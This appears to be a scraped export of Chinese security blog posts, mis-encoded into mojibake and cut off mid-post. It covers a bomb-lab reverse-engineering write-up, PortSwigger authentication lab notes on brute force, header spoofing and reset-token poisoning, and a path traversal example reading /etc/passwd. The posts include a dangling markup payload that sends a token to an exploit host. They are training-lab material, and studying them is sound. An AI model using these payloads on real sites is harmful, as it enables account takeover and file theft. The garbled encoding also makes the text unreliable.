è¿™é‡Œæˆ‘ä»¬çŸ¥é“è¾“å…¥ä¸¤ä¸ªå‚æ•°ï¼Œä¸”å‚æ•°2ä¸º0ï¼Œå‚æ•°1 &lt;= 0xeï¼Œæ¥ç€çœ‹func4 # edx = i, esi = j, edi = k, eax = result0x0000000000400fce &lt;+0&gt;: sub rsp,0x80x0000000000400fd2 &lt;+4&gt;: mov eax,edx # eax = i0x0000000000400fd4 &lt;+6&gt;: sub eax,esi # num = i - j0x0000000000400fd6 &lt;+8&gt;: mov ecx,eax # val = num0x0000000000400fd8 &lt;+10&gt;: shr ecx,0x1f # val = num &gt;&gt; 0x1f = 0 0x0000000000400fdb &lt;+13&gt;: add eax,ecx # temp = num + val åˆ¤æ–­ç¬¦å·0x0000000000400fdd &lt;+15&gt;: sar eax,1 # temp = temp / 2 0x0000000000400fdf &lt;+17&gt;: lea ecx,[rax+rsi*1] # (i/2 - j/2 + j) == (i + j) / 2;0x0000000000400fe2 &lt;+20&gt;: cmp ecx,edi # temp,k0x0000000000400fe4 &lt;+22&gt;: jle 0x400ff2 &lt;func4+36&gt;0x0000000000400fe6 &lt;+24&gt;: lea edx,[rcx-0x1] # i = temp - 10x0000000000400fe9 &lt;+27&gt;: call 0x400fce &lt;func4&gt;0x0000000000400fee &lt;+32&gt;: add eax,eax # return result * 20x0000000000400ff0 &lt;+34&gt;: jmp 0x401007 &lt;func4+57&gt;0x0000000000400ff2 &lt;+36&gt;: mov eax,0x0 # return result = 00x0000000000400ff7 &lt;+41&gt;: cmp ecx,edi0x0000000000400ff9 &lt;+43&gt;: jge 0x401007 &lt;func4+57&gt;0x0000000000400ffb &lt;+45&gt;: lea esi,[rcx+0x1] # j = temp + 10x0000000000400ffe &lt;+48&gt;: call 0x400fce &lt;func4&gt;0x0000000000401003 &lt;+53&gt;: lea eax,[rax+rax*1+0x1] # return result * 2 + 10x0000000000401007 &lt;+57&gt;: add rsp,0x80x000000000040100b &lt;+61&gt;: ret å¯ä»¥å‘ç°æ˜¯ä¸ªé€’å½’å‡½æ•°,è·Ÿç€æ±‡ç¼–ä¸€æ­¥ä¸€æ­¥æŠŠCä»£ç å†™å‡ºæ¥ï¼Œå†™ä¸ªè„šæœ¬æ±‚å‡ºå€¼ï¼Œè¿™ä¸ªè¿˜æ˜¯èŠ±äº†ä¸å°‘æ—¶é—´ï¼Œå¯¹æ±‡ç¼–çš„ç»“æ„è¿˜æ˜¯ä¸å¤ªç†Ÿæ‚‰ï¼Œå¤ªğŸ¥¬äº† exp #include &quot;stdio.h&quot;int func4(int k, int j, int i){ // edx = i, esi = j, edi = k int val, temp, result; val = (i - j) &gt;&gt; 0x1f; temp = (i-j) + val; temp = temp &gt;&gt; 1; temp += j; if(temp &gt; k) { return 2 * func4(k, j, temp - 1); } result = 0; if(temp &lt; k) { return 2 * func4(k, temp + 1, i) + 1; } return result;}int main(void){ for (int k = 0; k &lt;= 14; ++k) { if(func4(k, 0, 14) == 0) { printf(&quot;%d &quot;, k); } } return 0;} æœ‰å››ä¸ªç­”æ¡ˆï¼Œéšä¾¿å¡«ä¸€ä¸ªå°±è¡Œ phase_50x0000000000401062 &lt;+0&gt;: push rbx0x0000000000401063 &lt;+1&gt;: sub rsp,0x200x0000000000401067 &lt;+5&gt;: mov rbx,rdi0x000000000040106a &lt;+8&gt;: mov rax,QWORD PTR fs:0x280x0000000000401073 &lt;+17&gt;: mov QWORD PTR [rsp+0x18],rax #ç†Ÿæ‚‰çš„canaryï¼Œä¸è¿‡å¥½åƒæ²¡å•¥ç”¨0x0000000000401078 &lt;+22&gt;: xor eax,eax0x000000000040107a &lt;+24&gt;: call 0x40131b &lt;string_length&gt;0x000000000040107f &lt;+29&gt;: cmp eax,0x6 #è¯»å…¥é•¿åº¦ä¸º6çš„å­—ç¬¦ä¸²0x0000000000401082 &lt;+32&gt;: je 0x4010d2 &lt;phase_5+112&gt;0x0000000000401084 &lt;+34&gt;: call 0x40143a &lt;explode_bomba&gt;0x0000000000401089 &lt;+39&gt;: jmp 0x4010d2 &lt;phase_5+112&gt;0x000000000040108b &lt;+41&gt;: movzx ecx,BYTE PTR [rbx+rax*1]0x000000000040108f &lt;+45&gt;: mov BYTE PTR [rsp],cl0x0000000000401092 &lt;+48&gt;: mov rdx,QWORD PTR [rsp]0x0000000000401096 &lt;+52&gt;: and edx,0xf #è·å–å½“å‰å­—ç¬¦ä¸²(rcxå¯„å­˜å™¨å¤„)çš„åå››ä½0x0000000000401099 &lt;+55&gt;: movzx edx,BYTE PTR [rdx+0x4024b0] #ä»¥rdxä¸ºç´¢å¼•ï¼Œä»0x4024b0å¤„çš„å­—ç¬¦ä¸²ä¸­å–å‡ºå­—ç¬¦0x00000000004010a0 &lt;+62&gt;: mov BYTE PTR [rsp+rax*1+0x10],dl #å­˜èµ·æ¥0x00000000004010a4 &lt;+66&gt;: add rax,0x1 #ç›¸å½“äºå¾ªç¯è®¡æ•°å™¨0x00000000004010a8 &lt;+70&gt;: cmp rax,0x60x00000000004010ac &lt;+74&gt;: jne 0x40108b &lt;phase_5+41&gt;0x00000000004010ae &lt;+76&gt;: mov BYTE PTR [rsp+0x16],0x00x00000000004010b3 &lt;+81&gt;: mov esi,0x40245e # è¦æ¯”è¾ƒçš„å­—ç¬¦ä¸² ---&gt; flyers0x00000000004010b8 &lt;+86&gt;: lea rdi,[rsp+0x10]0x00000000004010bd &lt;+91&gt;: call 0x401338 &lt;strings_not_equal&gt;0x00000000004010c2 &lt;+96&gt;: test eax,eax0x00000000004010c4 &lt;+98&gt;: je 0x4010d9 &lt;phase_5+119&gt;0x00000000004010c6 &lt;+100&gt;: call 0x40143a &lt;explode_bomb&gt;0x00000000004010cb &lt;+105&gt;: nop DWORD PTR [rax+rax*1+0x0]0x00000000004010d0 &lt;+110&gt;: jmp 0x4010d9 &lt;phase_5+119&gt;0x00000000004010d2 &lt;+112&gt;: mov eax,0x00x00000000004010d7 &lt;+117&gt;: jmp 0x40108b &lt;phase_5+41&gt;0x00000000004010d9 &lt;+119&gt;: mov rax,QWORD PTR [rsp+0x18]0x00000000004010de &lt;+124&gt;: xor rax,QWORD PTR fs:0x280x00000000004010e7 &lt;+133&gt;: je 0x4010ee &lt;phase_5+140&gt;0x00000000004010e9 &lt;+135&gt;: call 0x400b30 &lt;__stack_chk_fail@plt&gt;0x00000000004010ee &lt;+140&gt;: add rsp,0x200x00000000004010f2 &lt;+144&gt;: pop rbx0x00000000004010f3 &lt;+145&gt;: ret å¤§æ¦‚æ„æ€å°±æ˜¯å¯¹ä½ è¾“å…¥çš„å­—ç¬¦ä¸²æ¯ä¸€ä¸ªå­—ç¬¦è¿›è¡Œä¸€é¡¿æ“ä½œï¼Œç®€å•æ¥è¯´å°±æ˜¯å¯¹æ¯ä¸ªå­—ç¬¦è¿›è¡Œ&amp; 0xfè¿ç®—ï¼Œç„¶åå°†è¿™ä¸ªæ•°å½“ä½œç´¢å¼•ï¼Œåˆ°ä¸Šå›¾ç¬¬ä¸€ä¸ªå­—ç¬¦ä¸²é‡Œæ‰¾åˆ°å¯¹åº”çš„é‚£ä¸ªå­—ç¬¦å­˜èµ·æ¥ï¼ŒæŠŠå…­ä½å­—ç¬¦éƒ½å¤„ç†æˆæ–°å­—ç¬¦åœ¨ä¸åé¢é‚£ä¸ªå­—ç¬¦ä¸²è¿›è¡Œæ¯”è¾ƒï¼Œç›¸åŒå°±è¿‡å…³ï¼Œå¯ä»¥å†™ä¸ªè„šæœ¬ exp data = [9, 15, 14, 5, 6, 7]payload = ''for k in range(0, 6): for i in range(97, 123): t = i &amp; 0xf if t == data[k]: payload += chr(i) breakprint(payload)#ionefg#å½“ç„¶ç­”æ¡ˆä¸æ­¢è¿™ä¸€ä¸ª è¿™ä¸ªæ›´åƒé€†å‘å¯†ç é¢˜.. phase_6è¿™é¢˜ç¡®å®éš¾ï¼Œæœ€å¥½æ˜¯åˆ†æˆä¸€éƒ¨åˆ†ä¸€éƒ¨åˆ†åœ°å»åˆ†æï¼Œå¾ˆå¤šæ—¶å€™è·³æ¥è·³å»ï¼Œå¯„å­˜å™¨çš„å€¼æ ¹æœ¬è®°ä¸æ¸…ï¼ˆå¯„ï¼Œè¿˜å¥½æœ‰å¼ºå¤§çš„gdb 0x00000000004010f4 &lt;+0&gt;: push r140x00000000004010f6 &lt;+2&gt;: push r130x00000000004010f8 &lt;+4&gt;: push r120x00000000004010fa &lt;+6&gt;: push rbp0x00000000004010fb &lt;+7&gt;: push rbx0x00000000004010fc &lt;+8&gt;: sub rsp,0x500x0000000000401100 &lt;+12&gt;: mov r13,rsp #r13 = rsp0x0000000000401103 &lt;+15&gt;: mov rsi,rsp #rsi = rsp0x0000000000401106 &lt;+18&gt;: call 0x40145c &lt;read_six_numbers&gt; #ç»å…¸å…­ä¸ªæ•°0x000000000040110b &lt;+23&gt;: mov r14,rsp #r14 = rsp = r13 = rsi0x000000000040110e &lt;+26&gt;: mov r12d,0x0 #r12d = 00x0000000000401114 &lt;+32&gt;: mov rbp,r13 #rbp = r13 = rsp0x0000000000401117 &lt;+35&gt;: mov eax,DWORD PTR [r13] #rax = num[i]0x000000000040111b &lt;+39&gt;: sub eax,0x1 #num[i] - 10x000000000040111e &lt;+42&gt;: cmp eax,0x50x0000000000401121 &lt;+45&gt;: jbe 0x401128 &lt;phase_6+52&gt; # num[i] &lt;= 60x0000000000401123 &lt;+47&gt;: call 0x40143a &lt;explode_bomb&gt;æ¯ä¸ªæ•°è¦å°äºç­‰äº6&lt;----------------------------------------------------------------------------------------&gt;0x0000000000401128 &lt;+52&gt;: add r12d,0x1 #r12d += 10x000000000040112c &lt;+56&gt;: cmp r12d,0x6 #è®¡æ•°å™¨0x0000000000401130 &lt;+60&gt;: je 0x401153 &lt;phase_6+95&gt;0x0000000000401132 &lt;+62&gt;: mov ebx,r12d 0x0000000000401135 &lt;+65&gt;: movsxd rax,ebx 0x0000000000401138 &lt;+68&gt;: mov eax,DWORD PTR [rsp+rax*4] #eax = num[i+1]0x000000000040113b &lt;+71&gt;: cmp DWORD PTR [rbp+0x0],eax #æ¯”è¾ƒnum[i]å’Œnum[i+1]0x000000000040113e &lt;+74&gt;: jne 0x401145 &lt;phase_6+81&gt;0x0000000000401140 &lt;+76&gt;: call 0x40143a &lt;explode_bomb&gt;0x0000000000401145 &lt;+81&gt;: add ebx,0x1 #ebx += 1 0x0000000000401148 &lt;+84&gt;: cmp ebx,0x5 #è®¡æ•°å™¨0x000000000040114b &lt;+87&gt;: jle 0x401135 &lt;phase_6+65&gt;0x000000000040114d &lt;+89&gt;: add r13,0x4 #r13 += 40x0000000000401151 &lt;+93&gt;: jmp 0x401114 &lt;phase_6+32&gt;å…­ä¸ªæ•°å„ä¸ç›¸ç­‰ï¼Œæ‰€ä»¥ä¸€å®šæ˜¯ 1 2 3 4 5 6 è¿™å…­ä¸ªæ•°ä¹‹é—´æ’åº&lt;----------------------------------------------------------------------------------------&gt;0x0000000000401153 &lt;+95&gt;: lea rsi,[rsp+0x18] #rsi = [rsp+0x18] = 0x000x0000000000401158 &lt;+100&gt;: mov rax,r14 #rax = r14 = rsp0x000000000040115b &lt;+103&gt;: mov ecx,0x7 #ecx = 0x70x0000000000401160 &lt;+108&gt;: mov edx,ecx #edx = 0x70x0000000000401162 &lt;+110&gt;: sub edx,DWORD PTR [rax] # edx = 7 - num[i]0x0000000000401164 &lt;+112&gt;: mov DWORD PTR [rax],edx # å†æŠŠç›¸å‡åçš„å€¼æ”¾åˆ°raxé‡Œ0x0000000000401166 &lt;+114&gt;: add rax,0x4 #rax-&gt;num[i+1]0x000000000040116a &lt;+118&gt;: cmp rax,rsi #æ¯”è¾ƒnum[i+1]ä¸00x000000000040116d &lt;+121&gt;: jne 0x401160 &lt;phase_6+108&gt;å°†æ‰€æœ‰å€¼å˜ä¸º 7-num[i]&lt;----------------------------------------------------------------------------------------&gt;0x000000000040116f &lt;+123&gt;: mov esi,0x0 #esi = 00x0000000000401174 &lt;+128&gt;: jmp 0x401197 &lt;phase_6+163&gt;0x0000000000401176 &lt;+130&gt;: mov rdx,QWORD PTR [rdx+0x8] #æŒ‡å‘ä¸‹ä¸€ä¸ªå€¼0x000000000040117a &lt;+134&gt;: add eax,0x10x000000000040117d &lt;+137&gt;: cmp eax,ecx #å¾ªç¯ç´¯åŠ eax0x000000000040117f &lt;+139&gt;: jne 0x401176 &lt;phase_6+130&gt;0x0000000000401181 &lt;+141&gt;: jmp 0x401188 &lt;phase_6+148&gt;0x0000000000401183 &lt;+143&gt;: mov edx,0x6032d00x0000000000401188 &lt;+148&gt;: mov QWORD PTR [rsp+rsi*2+0x20],rdx #rdx-&gt;node6(0x1bb)0x000000000040118d &lt;+153&gt;: add rsi,0x40x0000000000401191 &lt;+157&gt;: cmp rsi,0x18 #0x18 = 24 å¾ªç¯6æ¬¡0x0000000000401195 &lt;+161&gt;: je 0x4011ab &lt;phase_6+183&gt;0x0000000000401197 &lt;+163&gt;: mov ecx,DWORD PTR [rsp+rsi*1] # ecx = 7-num[i]0x000000000040119a &lt;+166&gt;: cmp ecx,0x1 ecx &lt;= 0x10x000000000040119d &lt;+169&gt;: jle 0x401183 &lt;phase_6+143&gt;0x000000000040119f &lt;+171&gt;: mov eax,0x1 #eax = 10x00000000004011a4 &lt;+176&gt;: mov edx,0x6032d0 #å¥‡æ€ªçš„åœ°å€ï¼Œè§ä¸‹é¢æˆªå›¾0x00000000004011a9 &lt;+181&gt;: jmp 0x401176 &lt;phase_6+130&gt;&lt;----------------------------------------------------------------------------------------&gt;node[i]-&gt;next = node[i-1];ç±»ä¼¼éå†é“¾è¡¨0x00000000004011ab &lt;+183&gt;: mov rbx,QWORD PTR [rsp+0x20]0x00000000004011b0 &lt;+188&gt;: lea rax,[rsp+0x28]0x00000000004011b5 &lt;+193&gt;: lea rsi,[rsp+0x50]0x00000000004011ba &lt;+198&gt;: mov rcx,rbx0x00000000004011bd &lt;+201&gt;: mov rdx,QWORD PTR [rax]0x00000000004011c0 &lt;+204&gt;: mov QWORD PTR [rcx+0x8],rdx0x00000000004011c4 &lt;+208&gt;: add rax,0x80x00000000004011c8 &lt;+212&gt;: cmp rax,rsi0x00000000004011cb &lt;+215&gt;: je 0x4011d2 &lt;phase_6+222&gt;0x00000000004011cd &lt;+217&gt;: mov rcx,rdx0x00000000004011d0 &lt;+220&gt;: jmp 0x4011bd &lt;phase_6+201&gt;&lt;----------------------------------------------------------------------------------------&gt;0x00000000004011d2 &lt;+222&gt;: mov QWORD PTR [rdx+0x8],0x00x00000000004011da &lt;+230&gt;: mov ebp,0x50x00000000004011df &lt;+235&gt;: mov rax,QWORD PTR [rbx+0x8]0x00000000004011e3 &lt;+239&gt;: mov eax,DWORD PTR [rax]0x00000000004011e5 &lt;+241&gt;: cmp DWORD PTR [rbx],eax0x00000000004011e7 &lt;+243&gt;: jge 0x4011ee &lt;phase_6+250&gt;0x00000000004011e9 &lt;+245&gt;: call 0x40143a &lt;explode_bomb&gt;0x00000000004011ee &lt;+250&gt;: mov rbx,QWORD PTR [rbx+0x8]0x00000000004011f2 &lt;+254&gt;: sub ebp,0x10x00000000004011f5 &lt;+257&gt;: jne 0x4011df &lt;phase_6+235&gt;0x00000000004011f7 &lt;+259&gt;: add rsp,0x500x00000000004011fb &lt;+263&gt;: pop rbx0x00000000004011fc &lt;+264&gt;: pop rbp0x00000000004011fd &lt;+265&gt;: pop r120x00000000004011ff &lt;+267&gt;: pop r130x0000000000401201 &lt;+269&gt;: pop r140x0000000000401203 &lt;+271&gt;: ret å‰é¢å­˜ç€è¾“å…¥çš„å€¼ï¼Œåé¢å­˜ç€åä¸€ä¸ªå€¼çš„åœ°å€ï¼ŒåŠ ä¸Šnodeçš„å­—çœ¼ï¼Œæ˜æ˜¾å°±æ˜¯é“¾è¡¨çš„ç»“æ„ï¼ˆè™½ç„¶æˆ‘æ•°æ®ç»“æ„æ²¡å­¦å¥½ï¼Œæˆ‘çˆ¬ ç¨å¾®ç®—ç®—å¤§æ¦‚å†™å‡ºè¿™ä¸ªç»“æ„ä½“ struct node{ int value; //4 nodeèŠ‚ç‚¹å­˜å‚¨çš„æ•°æ® int index; //4 è¡¨ç¤ºæ˜¯åœ¨èŠ‚ç‚¹ç¬¬å‡ ä¸ªå…ƒç´  node* next; //8 æŒ‡å‘ä¸‹ä¸€ä¸ªèŠ‚ç‚¹};hex-&gt;dec0x14-&gt;1-&gt;3320xa8-&gt;2-&gt;1680x39c-&gt;3-&gt;9240x2b3-&gt;4-&gt;6910x1dd-&gt;5-&gt;4770x1bb-&gt;6-&gt;4437-num[i] -&gt; valuevalueä»å¤§åˆ°å°æ’åˆ—3 4 5 6 1 2æ‰€ä»¥è¾“å…¥åºåˆ—åº”è¯¥ä¸º4 3 2 1 6 5 è¿™å°±æ‹†å®Œäº†å…­ä¸ªå…³å¡çš„ç‚¸å¼¹ To Doâ€¦","link":"/2022/01/27/bomb/"},{"title":"Burpsuiteé¶åœº----èº«ä»½è®¤è¯ä¸“é¢˜","text":"èº«ä»½è®¤è¯ä¸“é¢˜ Burp Intruderæ¨¡å—æ–¹æ³• å…¶ä¸­é‡Œé¢çš„æ­£åˆ™æå–åŠŸèƒ½çœŸçš„å¾ˆå¼ºå¤§å¾ˆå¥½ç”¨ Lab: Username enumeration via response timingé€šè¿‡ç™»å½•æˆåŠŸä¸å¦é¡µé¢å“åº”çš„æ—¶é—´ä¸åŒæ¥åˆ¤æ–­ é¦–å…ˆï¼Œå°è¯•å¤šæ¬¡å¤±è´¥ä¼šè¢«banæ‰ipï¼Œè¿™é‡Œæˆ‘ä»¬å¯ä»¥æ„é€ XFFå¤´æ¥ç»•è¿‡ï¼ŒX-Forwarded-For: 3737 å…¶æ¬¡ï¼Œå¦‚æœç”¨æˆ·åæ— æ•ˆï¼Œåˆ™é¡µé¢æ—¶é—´å“åº”å·®ä¸å¤šï¼Œä½†æ˜¯å¦‚æœç”¨æˆ·åæ˜¯å¯¹çš„ï¼Œé¡µé¢å“åº”æ—¶é—´å°±ä¼šå’Œå¯†ç é•¿åº¦æœ‰å…³ï¼Œæ‰€ä»¥é¢˜ç›®ç»™äº†ä¸€ä¸ªæ­£ç¡®çš„ç”¨æˆ·åå’Œå¯†ç ï¼Œæ–¹ä¾¿è§‚å¯Ÿæµ‹è¯• ç„¶åå°±æ˜¯æ­£å¸¸çš„çˆ†ç ´ï¼Œç”¨pitchforkæ¨¡å¼ â€“ æ¯ä¸€ä¸ªå˜é‡æ ‡è®°å¯¹åº”ä¸€ä¸ªå­—å…¸ï¼Œä¸€ä¸€å¯¹åº”è¿›è¡Œç ´è§£ã€‚ Flawed brute-force protectioné˜²æ­¢æš´åŠ›ç ´è§£æœ€å¸¸è§æœ‰æ•ˆçš„ä¸¤ç§æ–¹æ³•å°±æ˜¯ å¦‚æœå°è¯•ç™»å½•å¤±è´¥æ¬¡æ•°è¿‡å¤šå°é”ip å¦‚æœå°è¯•å¿«é€Ÿç™»å½•å¾ˆå¤šæ¬¡é˜»æ­¢è¿œç¨‹ip è€Œè¿™ä¸¤ç§æ–¹æ³•ï¼Œéƒ½æœ‰ç¼ºé™·ï¼Œå› ä¸ºå®ƒä¼šä»¥ç™»å½•æˆåŠŸæ¥é‡ç½®è¿™ä¸ªç™»å½•çš„è®¡æ•°å™¨ï¼Œæ¯”å¦‚è¿™ä¸ªå®éªŒå…è®¸ç™»å½•ä¸‰æ¬¡ï¼Œæˆ‘ä»¬å°±å¯ä»¥åœ¨ä¸‰æ¬¡å†…æˆåŠŸä¸€æ¬¡å°±å¯ä»¥åˆæœ‰ä¸‰æ¬¡æœºä¼šï¼Œè€Œæˆ‘ä»¬åªéœ€è¦ä¸€ä¸ªå·²ç»çŸ¥é“çš„è´¦æˆ· æ‰€ä»¥æˆ‘ä»¬å¯ä»¥æ„é€ è¿™æ ·çš„å­—å…¸ è´¦æˆ· å¯†ç  å¥‡æ•°ä¸ºæˆ‘ä»¬éœ€è¦çˆ†ç ´çš„å¯†ç ï¼Œå¶æ•°åˆ™ä¸ºå·²çŸ¥çš„å¯†ç  æ³¨æ„çˆ†ç ´çš„æ—¶å€™æŠŠçº¿ç¨‹è°ƒå°ï¼Œé˜²æ­¢çº¿ç¨‹å¤ªå¤§ä¾ç„¶ä¼šå¯¼è‡´ç™»å½•è¿‡å¿« Account lockingè´¦æˆ·é”å®šï¼Œå› ä¸ºä¹Ÿæ˜¯ä¼šå°†â€è¯¥ç”¨æˆ·å·²é”å®šâ€ä¹‹ç±»çš„å­—æ ·æ˜¾ç¤ºåœ¨å“åº”åŒ…ä¸­çš„ï¼Œæ‰€ä»¥ä¹Ÿå¯ä»¥ç”¨äºæšä¸¾ç”¨æˆ·å æœ‰ä¸€ä¸ªç”¨æˆ·åçš„å­—å…¸ï¼Œå…¶ä¸­åŒ…æ‹¬äº†æœ‰æ•ˆçš„ç”¨æˆ·ï¼Œéšä¾¿ä¸€ä¸ªå¯†ç ï¼Œç”¨burpçˆ†ç ´ï¼Œæ¯ä¸ªè´¦æˆ·éƒ½çˆ†ç ´è®¾ç½®çš„é˜™å€¼æ¬¡æ•°ï¼Œè€Œæœ‰æ•ˆçš„è´¦æˆ·ä»–è¿”å›çš„åŒ…é•¿åº¦æ¯”å…¶ä»–çš„å¤§ï¼ˆå› ä¸ºæœ‰â€è¯¥ç”¨æˆ·å·²é”å®šâ€ç±»ä¼¼çš„å­—æ ·ï¼‰ ç„¶åå°±å¯ä»¥æ ¹æ®è¿™ä¸ªå·²çŸ¥çš„ç”¨æˆ·åå»çˆ†ç ´å…¶å¯†ç  å› ä¸ºæœ‰äº›äººå–œæ¬¢å°†ä¸åŒç½‘ç«™å¯†ç è®¾ç½®æˆç›¸åŒçš„ï¼Œè¿™å°±å¯¼è‡´å¦‚æœä»–ä»¬å…¶ä¸­ä¸€ä¸ªè´¦æˆ·å¯†ç æ³„æ¼ä»¥åå¯ä»¥ç”¨æ¥ç™»å½•å…¶ä»–è´¦æˆ·ï¼Œå¹¶ä¸”å› ä¸ºåªå°è¯•ä¸€æ¬¡è€Œæ— æ³•è§¦å‘è¯¥é˜²æŠ¤æ‰‹æ®µ Lab: Broken brute-force protection, multiple credentials per requestç”¨æˆ·ç™»å½•æœ‰é¢‘ç‡é™åˆ¶ å¯ä»¥å°†usernameå’Œpasswordç»„åˆæˆå­—å…¸å½¢å¼ï¼Œä»¥jsonæ ¼å¼å‘åŒ…ä¸€æ¬¡å‘å‡ºå»ï¼Œè®©ç³»ç»Ÿä¸€ä¸ªä¸€ä¸ªå¯¹æ¯” è¿™é‡Œæ”¾ä¸€ä¸ªå°è„šæœ¬ï¼Œè½¬åŒ–ä¸‹æ ¼å¼ #!/usr/bin/env python3file = open('./1.txt', 'r')lines = file.readlines()for line in lines: print('&quot;{}&quot;,'.format(line.strip()))file.close() åˆ«é—®ï¼Œé—®å°±æ˜¯Officeé‚£äº›è¿˜ä¸å¤ªä¼šç”¨ Lab: 2FA broken logicè¿™ä¸ªå®éªŒæˆ‘tmçˆ†ç ´äº†äº”æ¬¡ï¼Œæœ‰æ—¶å€™å‚æ•°ä¼ é”™äº†ï¼Œæœ‰æ¬¡å¿˜è®°çˆ†ç ´å®Œäº†ï¼Œæ²¡å»äº¤ç­”æ¡ˆã€‚ã€‚ã€‚æ— è¯­äº† ä¸»è¦åˆ©ç”¨æ–¹æ³•å°±æ˜¯å› ä¸ºï¼Œæˆ‘ä»¬å¯ä»¥ç”¨è‡ªå·±çš„è´¦æˆ·å»ç™»å½•ï¼Œç„¶åæ”¹éªŒè¯ç”¨æˆ·æ—¶çš„é‚£ä¸ªuser cookieï¼Œå†å»çˆ†ç ´ç”¨å—å®³è€…ç”¨æˆ·å‘é€çš„éªŒè¯ç  çœŸçš„å¥½éš¾ç­‰ã€‚ã€‚ é‡ç½®å¯†ç 1.ä½¿ç”¨é‚®ç®±é‡ç½®å¦‚æœå°†æ–°å¯†ç ç›´æ¥å‘é€ç»™ç”¨æˆ·é‚®ç®±ï¼Œè¿™æ˜¯å¾ˆè ¢çš„è¡Œä¸ºï¼Œå¾ˆå®¹æ˜“é­åˆ°ä¸­é—´äººçªƒå–ï¼Œå› ä¸ºæœ‰äº›ç”¨æˆ·çš„ä¿¡æ¯ä¼šåœ¨å¤šç«¯åŒæ­¥ï¼Œæ‰€ä»¥ç”µå­é‚®ç®±é‡ç½®ä¸€èˆ¬è®¤ä¸ºæ˜¯ä¸å®‰å…¨çš„ 2.ä½¿ç”¨URLé‡ç½® æœ‰äº›ç½‘ç«™åœ¨æäº¤é‡ç½®å¯†ç è¡¨å•ï¼Œå¹¶ä¸ä¼šéªŒè¯tokenï¼Œæ‰€ä»¥hackerå¯ä»¥ç›´æ¥åˆ é™¤tokenéªŒè¯ï¼Œé‡ç½®ä»»æ„ç”¨æˆ·å¯†ç  Lab: Password reset poisoning via middlewareè¿™ä¸ªå®éªŒï¼Œé‡ç½®å¯†ç çš„tokenæ˜¯åŠ¨æ€ç”Ÿæˆå‘ç»™é‚®ç®±ï¼Œä½†æ˜¯ä»–ä¼šå‘ç»™æŒ‡å®šHOSTå­—æ®µçš„åŸŸåï¼Œæ‰€ä»¥æˆ‘ä»¬å¯ä»¥åˆ©ç”¨X-Forwarded-Hostæ¥ä¿®æ”¹æˆ‘ä»¬è‡ªå·±æœåŠ¡å™¨çš„åŸŸåï¼Œå¯ä»¥æ¥æ”¶åˆ°å‘ç»™å…¶ä»–ç”¨æˆ·çš„é‡ç½®å¯†ç çš„token æœ‰äº†è¿™ä¸ªå°±å¯ä»¥é‡ç½®å—å®³è€…çš„å¯†ç ï¼Œç±»ä¼¼äºXSSæ”»å‡»çš„åˆ©ç”¨ Lab: Password brute-force via password changeæœ‰æ—¶å€™ç”¨æˆ·éœ€è¦æ›´æ”¹å¯†ç ï¼Œè€Œæœ‰äº›æƒ…å†µæ˜¯ï¼Œç³»ç»Ÿä¸å¼ºåˆ¶è¦æ±‚åªèƒ½æ›´æ”¹å½“å‰ç™»å½•ç”¨æˆ·çš„å¯†ç ï¼Œç„¶åæ ¹æ®æŸä¸ªå‚æ•°åå®šä½ç”¨æˆ·ï¼Œå› ä¸ºè¾“å…¥é”™è¯¯å½“å‰å¯†ç å’Œè¾“å…¥æ­£ç¡®å½“å‰å¯†ç ä½†æ˜¯ä¸¤æ¬¡éªŒè¯æ–°å¯†ç é”™è¯¯ï¼Œä¸¤è€…æç¤ºä¸ä¸€æ ·ï¼Œå¯ä»¥é€šè¿‡çˆ†ç ´æ¥åˆ¤æ–­æŸä¸ªç”¨æˆ·çš„æ—§å¯†ç  Lab: Password reset poisoning via dangling markupè¿™ä¸ªä¸»è¦æ˜¯åˆ©ç”¨ä¸€ä¸ªXSSç‚¹å»æ‰“ï¼Œå¾—åˆ°å‘é€åˆ°ç”¨æˆ·çš„é‚®ä»¶(å› ä¸ºä¹‹å‰é‚£ä¸ªè¯„è®ºçš„xssç‚¹è¢«è¿‡æ»¤äº† æˆ‘ä»¬å‘ç°ï¼Œè™½ç„¶æ”¹äº†HOSTæœåŠ¡å™¨ä¼šè¿”å›é”™è¯¯ï¼Œä½†æ˜¯æˆ‘ä»¬å¯ä»¥æ”¹ä»»æ„ç«¯å£ï¼Œå‘ç°ä¹Ÿæ˜¯å¯ä»¥è®¿é—®çš„Host: ac231fcd1ebf78a2c0da32e500e90045.web-security-academy.net:6666ï¼Œç„¶åæˆ‘ä»¬å¯ä»¥æŸ¥çœ‹åˆ°é‚®ä»¶æœ‰ä¸ªview rawï¼Œå‘ç°è¿™é‡Œçš„htmlå¹¶æ²¡æœ‰è¿›è¡Œè¿‡æ»¤ï¼Œæˆ‘ä»¬å¯ä»¥åˆ©ç”¨ç±»ä¼¼è¿™æ ·çš„payloadå»æ‰“&quot;&gt;&lt;img src=&quot;//exploit-ac101fda1e5a7810c09632bf012200cf.web-security-academy.net/?ï¼Œè¿™å«åšDangling markup injectionåœ¨åé¢çš„xssæ”»å‡»ä¸­ä¼šè®²åˆ° ä¹‹åå°±å¯ä»¥åœ¨è‡ªå·±æœåŠ¡å™¨çš„logä¸­æŸ¥çœ‹åˆ°å¯†ç  è¿™ä¸ªä¸“é¢˜å°±åšå®Œäº†ï¼Œé™¤äº†é‚£ä¸ª2FAçš„çˆ†ç ´ã€‚ã€‚ã€‚å¤ªæ…¢äº†ï¼Œæˆ‘ä¸é…åš","link":"/2022/03/06/burp_authentication/"},{"title":"Burpsuiteé¶åœº---ç›®å½•ç©¿è¶Šä¸“é¢˜","text":"ç›®å½•ç©¿è¶Šä¸“é¢˜ ç›®å½•ç©¿è¶Šè¯»å–ä»»æ„æ–‡ä»¶0x1åˆ©ç”¨è¿”å›ä¸Šçº§ç›®å½•ç¬¦..æ¥ç©¿è¶Š æ¯”å¦‚ä¸€ä¸ªurl?filename=test.jpgï¼Œå†™è¿‡ç‚¹ä»£ç çš„éƒ½çŸ¥é“å›¾ç‰‡æ”¾åœ¨å½“å‰ç±»ä¼¼imageçš„ç›®å½•ä¸‹ï¼Œç»“åˆlinuxçš„æ–‡ä»¶ç®¡ç†ï¼Œè¿™å¼ å›¾çš„ç»å¯¹è·¯å¾„å°±æ˜¯/var/www/image/test.jpg äºæ˜¯æˆ‘ä»¬å°±å¯ä»¥è¿™æ ·æ‹¼æ¥?filename=../../../etc/passwdå®ç°ä»»æ„æ–‡ä»¶è¯»å– 0x2 ç¦ç”¨äº†..ç¬¦å¦‚æœä¸èƒ½ç”¨..æˆ‘ä»¬ä¹Ÿå¯ä»¥å°è¯•ç›´æ¥ä¼ ç»å¯¹è·¯å¾„?filename=/ect/passwd 0x3 